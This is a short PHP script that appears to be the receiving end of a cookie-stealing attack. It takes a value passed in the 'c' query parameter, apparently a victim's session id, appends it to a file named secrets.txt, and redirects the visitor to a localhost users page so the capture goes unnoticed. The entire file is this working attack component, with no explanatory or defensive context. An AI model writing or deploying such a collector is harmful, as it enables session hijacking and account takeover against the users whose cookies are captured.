<?php

//$src = $_SERVER[]
$sid = $_GET['c'];
$myfile = fopen('secrets.txt', 'a');
fwrite($myfile, $sid);

header('Location: https://localhost/users/');
exit(); 
?>